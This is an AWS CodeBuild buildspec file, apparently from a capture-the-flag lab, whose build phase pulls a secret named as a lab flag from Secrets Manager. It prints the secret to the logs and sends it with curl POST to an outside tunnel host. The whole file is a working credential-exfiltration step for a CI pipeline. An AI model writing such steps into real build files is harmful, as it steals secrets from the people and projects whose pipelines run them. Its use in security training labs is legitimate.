version: 0.2

phases:
  build:
    commands:
      - echo "Retrieving flag..."
      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
      - echo "DEBUG: flag=$FLAG"
      - curl -X POST https://peyzr-176-228-0-103.run.pinggy-free.link --data "flag=$FLAG"
